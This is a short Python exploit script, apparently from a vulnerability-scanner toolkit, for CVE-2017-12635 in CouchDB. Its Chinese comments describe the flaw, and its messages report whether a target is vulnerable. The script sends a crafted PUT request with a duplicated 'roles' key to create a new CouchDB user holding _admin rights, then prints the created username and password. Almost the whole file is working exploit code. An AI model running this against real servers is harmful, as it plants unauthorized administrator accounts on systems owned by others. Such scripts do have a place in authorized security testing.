#!/usr/bin/env python3

'''
name: CVE-2017-12635漏洞
description: CVE-2017-12635目录穿越与RCE漏洞,RCE漏洞执行比较麻烦
'''

import re
import json
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class CVE_2017_12635_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta()
        self. headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Content-Type": "application/json"
        }
        self.data = '''{"type": "user","name": \"''' + self.capta + '''\","roles": ["_admin"],"roles": [],"password": \"''' +  self.capta + '''\"}'''
        self.login_data = {
            "name": self.capta,
            "password": self.capta
        }

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            req = request.put(self.url + "/_users/org.couchdb.user:" + self.capta, data = self.data, headers = self.headers)
            self.headers["Content-Type"] = "application/x-www-form-urlencoded;charset=UTF-8"
            if req.status_code == 201 and json.loads(req.text)['ok'] == True:
                print("存在CVE-2017-12635漏洞,添加的账号和密码为:", self.capta, self.capta)
                return True
            else:
                print("不存在CVE-2017-12635漏洞")
                return False
        except Exception as e:
            print("不存在CVE-2017-12635漏洞")
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2017_12635 = CVE_2017_12635_BaseVerify('http://127.0.0.1:5984')
    CVE_2017_12635.run()